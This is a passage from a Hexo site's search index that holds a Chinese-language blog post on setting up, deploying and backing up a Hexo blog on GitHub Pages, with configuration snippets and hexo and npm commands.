class="string">"center"</span>&gt;可在边栏搜索框中对本站进行检索，以获取相关信息。&lt;/p&gt;</span><br><span class="line">&lt;div style=<span class="string">"text-align: center"</span>&gt;</span><br><span class="line">以下是博主喜欢的一些歌曲，可以听听，稍作休息~</span><br><span class="line">&lt;iframe frameborder=<span class="string">"no"</span> border=<span class="string">"0"</span> marginwidth=<span class="string">"0"</span> marginheight=<span class="string">"0"</span> width=320 height=330 src=<span class="string">"http://music.163.com/outchain/player?type=0&amp;id=112513213&amp;auto=0&amp;height=430"</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="发布博客内容"><a href="#发布博客内容" class="headerlink" title="发布博客内容"></a>发布博客内容</h2><p>实现发布，前提是配置好，部署到Github前需要配置_config.yml文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: http://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: github</span><br><span class="line">  repository: git@github.com:zhchnchn/zhchnchn.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>更新的最新版本，可能会有Bug，自行百度，好像要修改type：git。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server <span class="comment">#开启预览访问端口（默认端口4000，'ctrl + c'关闭server）Hexo 会监视文件变动并自动更新，您无须重启服务器。</span></span><br><span class="line">$ hexo g <span class="comment">#生成</span></span><br><span class="line">$ hexo generate <span class="comment">#生成静态页面至public目录（最终上传这个文件到GitHub）</span></span><br><span class="line">$ hexo d == hexo deploy<span class="comment">#部署</span></span><br><span class="line">$ hexo d <span class="comment">#部署 # 可与hexo g合并为 hexo d -g</span></span><br><span class="line">$ hexo deploy -g</span><br><span class="line">$ hexo server -g <span class="comment"># 生成默认文件群再执行,开启本地静态html服务器</span></span><br></pre></td></tr></table></figure><h2 id="文章图片路径"><a href="#文章图片路径" class="headerlink" title="文章图片路径"></a>文章图片路径</h2><p>Hexo如何方式图片，图片应该放置到哪里，不会应为上传而覆盖掉。然后把文章里的index.md删除，将文件存放在resource文件夹中间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  发布页面</span><br><span class="line">$ hexo new page <span class="string">"name"</span> <span class="comment"># 新建一个页面，页面名称name</span></span><br><span class="line">  UUhike@UUhike-pc MINGW64 /d/Hexo/Hexo (master)</span><br><span class="line">$ hexo new page <span class="string">"resoures"</span></span><br><span class="line">  INFO  Created: D:\Hexo\Hexo\<span class="built_in">source</span>\resoures\index.md</span><br></pre></td></tr></table></figure><h2 id="Hexo文件备份"><a href="#Hexo文件备份" class="headerlink" title="Hexo文件备份"></a>Hexo文件备份</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">  git-backup.</span><br><span class="line">  Install</span><br><span class="line">  <span class="keyword">if</span> your hexo version is 2.x.x, you should install as follow:</span><br><span class="line">$ npm install hexo-git-backup@0.0.91 --save</span><br><span class="line">  <span class="keyword">if</span> version is 3.x.x, you should install as follow:</span><br><span class="line">$ npm install hexo-git-backup --save</span><br><span class="line">  Update</span><br><span class="line">  <span class="keyword">if</span> you install with --save, you must remove firstly when you update it.</span><br><span class="line">$ npm remove hexo-git-backup</span><br><span class="line">$ npm install hexo-git-backup --save</span><br><span class="line">  Configure</span><br><span class="line">  You should configure this plugin <span class="keyword">in</span> _config.yml.</span><br><span class="line">backup:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository:</span><br><span class="line">    github: git@github.com:xxx/xxx.git,branchName</span><br><span class="line">    gitcafe: git@github.com:xxx/xxx.git,branchName</span><br><span class="line">Using</span><br><span class="line">hexo backup </span><br><span class="line">or</span><br><span class="line">hexo b</span><br><span class="line">Options</span><br><span class="line"><span class="keyword">if</span> you want to back up with your theme,just add theme: your theme name,your theme name <span class="keyword">in</span> _config.yml.</span><br><span class="line">backup:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  theme: coney,landscape,xxx</span><br><span class="line">  repository:</span><br><span class="line">    github: git@github.com:xxx/xxx.git,branchName</span><br><span class="line">    gitcafe: git@github.com:xxx/xxx.git,branchName</span><br><span class="line">Attention: <span class="keyword">if</span> you <span class="keyword">do</span> as above, the dir themes/coney/.gitwill be removed</span><br><span class="line"><span class="keyword">if</span> you want DIY commit message, just add <span class="string">'message: update xxx'</span>.</span><br><span class="line">backup:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  message: update xxx</span><br><span class="line">  repository:</span><br><span class="line">    github: git@github.com:xxx/xxx.git,branchName</span><br><span class="line">    gitcafe: git@github.com:xxx/xxx.git,branchName</span><br><span class="line">Now you can backup all the blog!</span><br><span class="line">Problems</span><br><span class="line">You may get some troubles by your computer<span class="string">' permission。</span></span><br><span class="line"><span class="string">Error: EISDIR, open</span></span><br><span class="line"><span class="string">it is caused by permission. just do '</span>sudo hexo b<span class="string">'</span></span><br><span class="line"><span class="string">sudo hexo b</span></span><br></pre></td></tr></table></figure><h1 id="本地浏览"><a href="#本地浏览" class="headerlink" title="本地浏览"></a>本地浏览</h1><p>hexo s<br>hexo s –draf 浏览全部文章同时可以浏览不同目录中的文件</p><p>参考资料：</p><p><a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="noopener">hexo你的博客</a><br><a href="http://www.jianshu.com/p/05289a4bc8b2/" target="_blank" rel="noopener">如何搭建一个独立博客——简明Github Pages与Hexo教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
